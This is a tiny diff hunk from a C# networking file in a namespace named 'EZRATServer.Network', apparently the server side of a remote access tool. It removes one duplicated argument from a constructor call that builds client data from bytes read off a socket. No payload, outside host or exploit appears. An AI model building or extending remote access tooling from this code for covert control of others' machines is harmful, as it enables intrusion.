@@ -55,7 +55,7 @@ namespace EZRATServer.Network
             byte[] data = new byte[1024];
             this.Receive(data);
             string result = Encoding.Default.GetString(data);
-            return new ClientData(id, result, result, result, result, result);
+            return new ClientData(id, result, result, result, result);
         }
     }
 }
